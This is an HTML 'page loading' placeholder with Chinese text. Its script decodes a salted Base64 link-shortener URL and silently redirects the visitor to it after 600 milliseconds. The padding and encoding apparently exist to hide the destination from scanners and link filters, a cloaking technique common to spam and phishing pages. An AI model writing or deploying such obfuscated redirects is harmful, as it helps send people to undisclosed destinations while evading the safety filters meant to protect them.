<!DOCTYPE html>
<html lang="zh">
<head>
  <meta charset="UTF-8">
  <title>页面加载中...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <div>页面加载中，请稍候…</div>

  <script>
    // 加盐编码（前缀+Base64链接+后缀）
    const wrapper = "keuiaHR0cHM6Ly92bGluay5jYy94eHh2dnY=kzew";

    // 解码逻辑（去除前后缀再 Base64 解码）
    const clean = wrapper.slice(4, -4); // 移除前4位和后4位
    const link = atob(clean);

    // 延迟跳转
    setTimeout(() => {
      location.href = link;
    }, 600);
  </script>
</body>
</html>
